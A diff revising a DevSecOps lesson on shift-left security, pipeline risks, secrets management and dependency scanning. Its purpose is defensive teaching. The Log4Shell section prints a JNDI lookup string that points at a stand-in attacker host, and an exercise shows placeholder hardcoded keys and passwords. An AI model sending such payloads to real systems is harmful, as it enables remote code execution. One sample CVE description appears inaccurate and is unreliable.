@@ -6,9 +6,8 @@ By the end of this lesson, you will be able to:
 
 1. **Explain** what DevSecOps is and how it differs from traditional DevOps
 2. **Describe** the shift-left security approach and its benefits
-3. **Identify** common security risks in CI/CD pipelines
-4. **Understand** secrets management and why it matters
-5. **Recognize** dependency vulnerabilities and their impact
+3. **Identify** common security risks in CI/CD pipelines and dependency vulnerabilities
+4. **Apply** secrets management best practices to protect sensitive credentials
 
 ---
 
@@ -33,7 +32,7 @@ Traditional approaches treated security as a final step before deployment - secu
 
 ---
 
-## Part 1 - What is DevSecOps? (20 minutes)
+## Part 1 - What is DevSecOps?
 
 ### Definition
 
@@ -163,7 +162,19 @@ https://www.redhat.com/rhdc/managed-files/styles/wysiwyg_full_width/private/devs
 
 ---
 
-## Part 2 - Shift-Left Security (20 minutes)
+### 🏃 Activity 1 — DevSecOps Real-World Discussion (10 min)
+
+Read the Equifax breach example above and discuss the following:
+
+1. The patch for the Apache Struts vulnerability was available for 2 months before the breach. What process failure do you think allowed this to happen?
+2. If Equifax had dependency scanning running in their CI/CD pipeline, how would the outcome have been different?
+3. Think about a company you use daily (banking app, social media, e-commerce). What kind of sensitive data do they hold, and what would the impact of a breach be?
+
+> **Key takeaway:** Security failures are almost always process failures, not just technical ones.
+
+---
+
+## Part 2 - Shift-Left Security
 
 ### What is Shift-Left?
 
@@ -309,13 +320,11 @@ Day 1, 2:35 PM: Pipeline passes, deploys
 
 ---
 
-## Part 3 - Pipeline Security Risks (25 minutes)
+## Part 3 - Pipeline Security Risks
 
 ### Common Security Risks in CI/CD Pipelines
 
 Your CI/CD pipeline is a critical part of your infrastructure. If compromised, attackers can inject malicious code into your application.
-
-Let's understand the main risks:
 
 ---
 
@@ -353,10 +362,6 @@ public class DatabaseConfig {
 
 ### Risk 2: Vulnerable Dependencies
 
-**What are dependencies?**
-- External libraries your code uses
-- Example: Spring Boot, PostgreSQL driver, Jackson JSON
-
 **The problem:**
 
 ```xml
@@ -371,7 +376,7 @@ public class DatabaseConfig {
 **Why this is dangerous:**
 - Old versions have known security flaws (CVEs)
 - Attackers actively exploit these
-- Easy target - vulnerability details are public
+- Easy target — vulnerability details are public
 
 **Example:**
 - Log4Shell vulnerability (December 2021)
@@ -416,11 +421,6 @@ FROM node:20-alpine
 - Modifies pipeline to inject malware
 - Malware deployed to production
 
-**Example attack:**
-- Hacker gets developer's credentials
-- Adds step to pipeline: "Upload sensitive data to attacker's server"
-- Code looks normal but pipeline steals data
-
 ---
 
 ### Risk 5: No Security Scanning in Pipeline
@@ -429,11 +429,6 @@ FROM node:20-alpine
 - Pipeline only checks if code compiles
 - Doesn't check for security issues
 - Vulnerable code reaches production
-
-**Why this is dangerous:**
-- Security issues discovered too late
-- Expensive emergency patches
-- Potential data breaches
 
 ---
 
@@ -507,7 +502,7 @@ https://www.aquasec.com/cloud-native-academy/supply-chain-security/ci-cd-pipelin
 
 ---
 
-## Part 4 - Secrets Management (30 minutes)
+## Part 4 - Secrets Management
 
 ### What are Secrets?
 
@@ -539,24 +534,10 @@ public class EmailService {
 
 **Why this is terrible:**
 
-1. **Exposed in Git**
-   - Committed to repository
-   - Visible in commit history forever
-   - Even if deleted later, still in history
-
-2. **Visible to everyone**
-   - Anyone with repo access sees secrets
-   - Contractors, interns, ex-employees
-   - If repo is public, entire world sees it
-
-3. **Can't rotate easily**
-   - If key is compromised, must change everywhere
-   - Need to update code, rebuild, redeploy
-   - Downtime during rotation
-
-4. **Same secrets everywhere**
-   - Development, staging, production use same key
-   - Breach in one environment affects all
+1. **Exposed in Git** — Committed to repository, visible in commit history forever. Even if deleted later, still in history
+2. **Visible to everyone** — Anyone with repo access sees secrets. If repo is public, entire world sees it
+3. **Can't rotate easily** — If key is compromised, must change everywhere, rebuild, redeploy
+4. **Same secrets everywhere** — Development, staging, production use same key. Breach in one affects all
 
 ---
 
@@ -592,7 +573,6 @@ public class EmailService {
     private final String apiKey;
     
     public EmailService() {
-        // Read from environment variable
         this.apiKey = System.getenv("SENDGRID_API_KEY");
     }
     
@@ -604,25 +584,10 @@ public class EmailService {
 
 **Benefits:**
 
-1. **Not in code**
-   - Never committed to Git
-   - Not visible in repo
-   - No history trail
-
-2. **Different per environment**
-   - Dev uses dev keys
-   - Production uses production keys
-   - Isolated and secure
-
-3. **Easy rotation**
-   - Change environment variable
-   - Restart application
-   - No code changes needed
-
-4. **Access controlled**
-   - Only ops/devops can set production secrets
-   - Developers don't need production keys
-   - Principle of least privilege
+1. **Not in code** — Never committed to Git, not visible in repo
+2. **Different per environment** — Dev uses dev keys, production uses production keys
+3. **Easy rotation** — Change environment variable, restart application, no code changes
+4. **Access controlled** — Only ops/devops can set production secrets
 
 ---
 
@@ -635,15 +600,7 @@ public class EmailService {
    - Add: `SENDGRID_API_KEY = <your-actual-key>`
    - CircleCI encrypts and stores it
 
-2. **Use in pipeline:**
-   ```yml
-   - run:
-       name: Deploy
-       command: |
-         echo "Using API Key from environment"
-   ```
-
-3. **Application reads it:**
+2. **Application reads it:**
    ```java
    String apiKey = System.getenv("SENDGRID_API_KEY");
    ```
@@ -654,10 +611,7 @@ public class EmailService {
 
 **1. Never commit secrets to Git**
 ```bash
-# Create .env file for local development
 echo "DATABASE_PASSWORD=localdev123" > .env
-
-# Add to .gitignore
 echo ".env" >> .gitignore
 ```
 
@@ -718,11 +672,8 @@ Hey John, the production DB password is: <password>
 
 ### Environment Variables in Spring Boot
 
-**Application uses environment variables:**
-
 ```properties
 # application.properties
-# Don't hardcode values
 spring.datasource.url=${DATABASE_URL}
 spring.datasource.username=${DATABASE_USERNAME}
 spring.datasource.password=${DATABASE_PASSWORD}
@@ -737,7 +688,45 @@ spring.datasource.password=${DATABASE_PASSWORD}
 
 ---
 
-## Part 5 - Dependency Vulnerabilities (40 minutes)
+### 🏃 Activity 2 — Spot the Security Mistake (10 min)
+
+Review the following code and configuration snippets. For each one, identify the security mistake and explain what the correct approach should be.
+
+**Snippet 1:**
+```java
+@RestController
+public class PaymentController {
+    private static final String STRIPE_KEY = "sk_live_abc123xyz789";
+    
+    @PostMapping("/charge")
+    public String charge() {
+        // process payment using STRIPE_KEY
+    }
+}
+```
+
+**Snippet 2:**
+```properties
+# application.properties committed to GitHub
+spring.datasource.url=jdbc:postgresql://prod-db.company.com:5432/customers
+spring.datasource.username=admin
+spring.datasource.password=SuperSecure2024!
+```
+
+**Snippet 3:**
+```yml
+# .circleci/config.yml
+- run:
+    name: Deploy
+    command: |
+      railway login --token railway_abc123def456
+```
+
+> **Discuss:** For each snippet — what could go wrong if this reached a public GitHub repo?
+
+---
+
+## Part 5 - Dependency Vulnerabilities
 
 ### What are Dependencies?
 
@@ -754,37 +743,13 @@ spring.datasource.password=${DATABASE_PASSWORD}
         <groupId>org.postgresql</groupId>
         <artifactId>postgresql</artifactId>
     </dependency>
-    <!-- Your app depends on these libraries -->
 </dependencies>
 ```
 
-**Your application doesn't work without them!**
-
----
-
-### Why Dependencies Matter
-
 **Modern applications use LOTS of dependencies:**
-
 - Typical Java application: 50-200 dependencies
 - Each dependency may have its own dependencies
 - You might indirectly use 500+ libraries
-
-**Example dependency tree:**
-
-```
-Your App
-├── Spring Boot
-│   ├── Spring Core
-│   ├── Spring Web
-│   │   ├── Tomcat
-│   │   └── Jackson JSON
-│   └── Logging Framework
-├── PostgreSQL Driver
-└── JUnit (for tests)
-```
-
-**You depend on ALL of these!**
 
 ---
 
@@ -823,10 +788,8 @@ A CVE is a publicly disclosed security vulnerability with:
 // Attacker sends this string:
 String malicious = "${jndi:ldap://attacker.com/evil}";
 
-// Log4j processes it and...
+// Log4j processes it and executes attacker's code!
 logger.info("User input: " + malicious);
-
-// ...executes attacker's code!
 ```
 
 **Impact:**
@@ -841,25 +804,6 @@ logger.info("User input: " + malicious);
 - Cost: Billions in remediation
 
 **Lesson:** One vulnerable dependency can affect millions!
-
----
-
-### How Vulnerabilities are Discovered
-
-**1. Security researchers find flaws**
-- Test popular libraries
-- Report to maintainers
-- CVE assigned
-
-**2. Hackers exploit before it's public (Zero-day)**
-- Vulnerability unknown to public
-- Used in attacks
-- Eventually discovered
-
-**3. Automated scanning finds issues**
-- Tools analyze code
-- Find potential vulnerabilities
-- Report to maintainers
 
 ---
 
@@ -893,117 +837,20 @@ logger.info("User input: " + malicious);
 
 ```xml
 <!-- Vulnerable -->
-<dependency>
-    <groupId>org.springframework.boot</groupId>
-    <artifactId>spring-boot-starter-web</artifactId>
-    <version>2.5.0</version>  <!-- OLD! Has CVE-2021-22118 -->
-</dependency>
+<version>2.5.0</version>  <!-- OLD! Has CVE-2021-22118 -->
 
 <!-- Fixed -->
-<dependency>
-    <groupId>org.springframework.boot</groupId>
-    <artifactId>spring-boot-starter-web</artifactId>
-    <version>2.5.12</version>  <!-- Patched version -->
-</dependency>
+<version>2.5.12</version>  <!-- Patched version -->
 ```
-
----
 
 **Example 2: Old PostgreSQL Driver**
 
 ```xml
 <!-- Vulnerable -->
-<dependency>
-    <groupId>org.postgresql</groupId>
-    <artifactId>postgresql</artifactId>
-    <version>42.2.5</version>  <!-- Has SQL injection vulnerability -->
-</dependency>
+<version>42.2.5</version>  <!-- Has SQL injection vulnerability -->
 
 <!-- Fixed -->
-<dependency>
-    <groupId>org.postgresql</groupId>
-    <artifactId>postgresql</artifactId>
-    <version>42.5.0</version>  <!-- Secure version -->
-</dependency>
-```
-
----
-
-### How to Check for Vulnerabilities
-
-**Manual checking (tedious):**
-1. Go to https://nvd.nist.gov/
-2. Search for each dependency
-3. Check if your version is vulnerable
-4. Repeat for 50+ dependencies
-5. Takes hours!
-
-**Automated scanning (better):**
-1. Run dependency scanning tool
-2. Tool checks all dependencies
-3. Matches against CVE database
-4. Generates report
-5. Takes seconds!
-
----
-
-### Dependency Scanning Tools
-
-**Popular tools:**
-
-1. **OWASP Dependency-Check**
-   - Free and open-source
-   - Supports Java, .NET, Python, Node.js
-   - CLI and CI/CD integration
-
-2. **Snyk**
-   - Free for open-source projects
-   - Great GitHub integration
-   - Automated pull requests for fixes
-
-3. **GitHub Dependabot**
-   - Built into GitHub
-   - Automatic security alerts
-   - Auto-creates PRs to fix vulnerabilities
-
-4. **WhiteSource/Mend**
-   - Enterprise tool
-   - License compliance + security
-   - Commercial product
-
-**In Lesson 4.14, we'll use OWASP Dependency-Check!**
-
----
-
-### Example Vulnerability Report
-
-```
-==================================================
-OWASP Dependency-Check Report
-==================================================
-
-HIGH SEVERITY VULNERABILITIES:
-
-1. spring-core-5.3.10.jar
-   CVE: CVE-2021-22096
-   Severity: HIGH (7.5)
-   Description: Spring Framework RCE vulnerability
-   Recommendation: Update to 5.3.16 or later
-
-2. postgresql-42.2.5.jar
-   CVE: CVE-2022-31197
-   Severity: MEDIUM (6.5)
-   Description: SQL injection in PostgreSQL JDBC
-   Recommendation: Update to 42.5.0 or later
-
-SUMMARY:
-Total Dependencies: 47
-Vulnerable Dependencies: 2
-Critical: 0
-High: 1
-Medium: 1
-Low: 0
-==================================================
+<version>42.5.0</version>  <!-- Secure version -->
 ```
 
 ---
@@ -1020,9 +867,7 @@ Deploy to production
     ↓
 3 months later: CVE published
     ↓
-Discover you're vulnerable
-    ↓
-Emergency patch
+Discover you're vulnerable → Emergency patch
 ```
 
 **With scanning in CI/CD:**
@@ -1037,7 +882,7 @@ Pipeline FAILS ← Caught immediately!
     ↓
 Developer updates to safe version
     ↓
-Pipeline passes, deploys
+Pipeline passes, deploys safely
 ```
 
 ---
@@ -1046,7 +891,6 @@ Pipeline passes, deploys
 
 **Problem:** You don't control all dependencies!
 
-**Example:**
 ```
 Your pom.xml:
 └── spring-boot-starter-web (you added this)
@@ -1065,41 +909,20 @@ Your pom.xml:
 
 **1. Keep dependencies up to date**
 ```bash
-# Check for updates regularly
 mvn versions:display-dependency-updates
 ```
 
-**2. Use dependency scanning in CI/CD**
-```yml
-# Run on every build
-- dependency-check
-```
+**2. Use dependency scanning in CI/CD** — run on every build
 
-**3. Don't ignore warnings**
-```
-"Oh, it's just a Medium severity, I'll fix it later..."
-← This is how breaches happen!
-```
+**3. Don't ignore warnings** — "It's just a Medium severity, I'll fix it later" is how breaches happen
 
-**4. Review dependency updates**
-```
-Don't blindly update everything!
-- Read changelogs
-- Test thoroughly
-- Update incrementally
-```
+**4. Review dependency updates** — read changelogs, test thoroughly, update incrementally
 
-**5. Remove unused dependencies**
-```xml
-<!-- Do you really need this? -->
-<dependency>
-    <artifactId>some-library-we-tried-once</artifactId>
-</dependency>
-```
+**5. Remove unused dependencies** — fewer dependencies = smaller attack surface
 
 ---
 
-## Part 6 - Security Scanning Tools Overview (15 minutes)
+## Part 6 - Security Scanning Tools Overview
 
 ### Types of Security Scanning
 
@@ -1137,7 +960,7 @@ Don't blindly update everything!
 **Why this tool?**
 - ✅ Free and open-source
 - ✅ Easy to integrate with CircleCI
-- ✅ Works with Java/Maven (your project)
+- ✅ Works with Java/Maven
 - ✅ Beginner-friendly
 - ✅ Well-documented
 - ✅ Widely used in industry
@@ -1158,12 +981,6 @@ Don't blindly update everything!
 mvn org.owasp:dependency-check-maven:check
 ```
 
-**What happens:**
-1. Downloads latest CVE database
-2. Analyzes all dependencies in pom.xml
-3. Matches versions against known vulnerabilities
-4. Creates report: `target/dependency-check-report.html`
-
 **Report includes:**
 - List of all dependencies
 - Which have vulnerabilities
@@ -1173,9 +990,40 @@ mvn org.owasp:dependency-check-maven:check
 
 ---
 
-### Integration with CI/CD
+### Example Vulnerability Report
 
-**In your CircleCI config (preview for 4.14):**
+```
+==================================================
+OWASP Dependency-Check Report
+==================================================
+
+HIGH SEVERITY VULNERABILITIES:
+
+1. spring-core-5.3.10.jar
+   CVE: CVE-2021-22096
+   Severity: HIGH (7.5)
+   Description: Spring Framework RCE vulnerability
+   Recommendation: Update to 5.3.16 or later
+
+2. postgresql-42.2.5.jar
+   CVE: CVE-2022-31197
+   Severity: MEDIUM (6.5)
+   Description: SQL injection in PostgreSQL JDBC
+   Recommendation: Update to 42.5.0 or later
+
+SUMMARY:
+Total Dependencies: 47
+Vulnerable Dependencies: 2
+Critical: 0
+High: 1
+Medium: 1
+Low: 0
+==================================================
+```
+
+---
+
+### Integration with CI/CD (Preview for Lesson 4.14)
 
 ```yml
 jobs:
@@ -1190,38 +1038,6 @@ jobs:
       - store_artifacts:
           path: target/dependency-check-report.html
 ```
-
-**Result:**
-- Runs on every commit
-- Catches vulnerabilities immediately
-- Prevents vulnerable code from reaching production
-
----
-
-### Other Tools (Reference)
-
-**For future learning:**
-
-1. **Snyk** - https://snyk.io/
-   - Great for beginners
-   - Free tier available
-   - Excellent GitHub integration
-
-2. **SonarQube** - https://www.sonarqube.org/
-   - Code quality + security
-   - Free community edition
-   - Enterprise features available
-
-3. **Trivy** - https://github.com/aquasecurity/trivy
-   - Container scanning
-   - Fast and comprehensive
-   - Easy to use
-
-4. **GitHub Advanced Security**
-   - Built into GitHub
-   - Dependency alerts
-   - Code scanning
-   - Secret scanning
 
 ---
 
@@ -1271,12 +1087,12 @@ If ANY scan fails → Pipeline stops!
 
 ### What You Learned Today
 
-1. ✅ **DevSecOps** integrates security throughout development lifecycle
-2. ✅ **Shift-Left** means catching security issues early (cheaper, faster)
-3. ✅ **Pipeline Risks** include hardcoded secrets, vulnerable dependencies, insecure containers
-4. ✅ **Secrets Management** uses environment variables, not hardcoded values
-5. ✅ **Dependency Vulnerabilities** are tracked as CVEs and need scanning
-6. ✅ **Security Scanning Tools** automate vulnerability detection
+1. ✅ **DevSecOps** integrates security throughout the development lifecycle
+2. ✅ **Shift-Left** means catching security issues early — cheaper and faster
+3. ✅ **Pipeline Risks** include hardcoded secrets, vulnerable dependencies, and insecure containers
+4. ✅ **Secrets Management** uses environment variables, never hardcoded values
+5. ✅ **Dependency Vulnerabilities** are tracked as CVEs and need automated scanning
+6. ✅ **Security Scanning Tools** automate vulnerability detection in CI/CD
 
 ---
 
@@ -1302,22 +1118,6 @@ If ANY scan fails → Pipeline stops!
 
 ---
 
-### Real-World Impact
-
-**Companies with Good DevSecOps:**
-- Deploy 46x more frequently
-- 96x faster mean time to recovery
-- 7x lower change failure rate
-- Less time fighting fires
-
-**Companies WITHOUT DevSecOps:**
-- Slow deployments
-- Expensive breaches
-- Reputation damage
-- Regulatory fines
-
----
-
 ### Preparing for Lesson 4.14
 
 **In the next lesson, you will:**
@@ -1330,34 +1130,18 @@ If ANY scan fails → Pipeline stops!
 **What to review before next lesson:**
 - Your CircleCI config from Lesson 4.12
 - Your devops-demo project structure
-- How to edit .circleci/config.yml
+- How to edit `.circleci/config.yml`
 
 ---
 
 ## Additional Resources
 
-### DevSecOps Concepts
 - [OWASP DevSecOps Guideline](https://owasp.org/www-project-devsecops-guideline/)
 - [DevSecOps Manifesto](https://www.devsecops.org/)
 - [NIST DevSecOps Reference Architecture](https://csrc.nist.gov/publications/detail/sp/800-204c/final)
-
-### Security Vulnerabilities
 - [National Vulnerability Database](https://nvd.nist.gov/)
 - [CVE Database](https://cve.mitre.org/)
 - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
-
-### Tools Documentation
 - [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/)
 - [Snyk](https://snyk.io/learn/)
 - [GitHub Security Features](https://docs.github.com/en/code-security)
-
-### Videos
-- [What is DevSecOps?](https://www.youtube.com/results?search_query=what+is+devsecops)
-- [Shift-Left Security Explained](https://www.youtube.com/results?search_query=shift+left+security)
-- [Log4Shell Explained](https://www.youtube.com/results?search_query=log4shell+explained)
-
----
-
-**End of Lesson 4.13**
-
-**Great work!** You now understand the foundations of DevSecOps. In Lesson 4.14, you'll put this knowledge into practice by adding automated security scanning to your CI/CD pipeline!
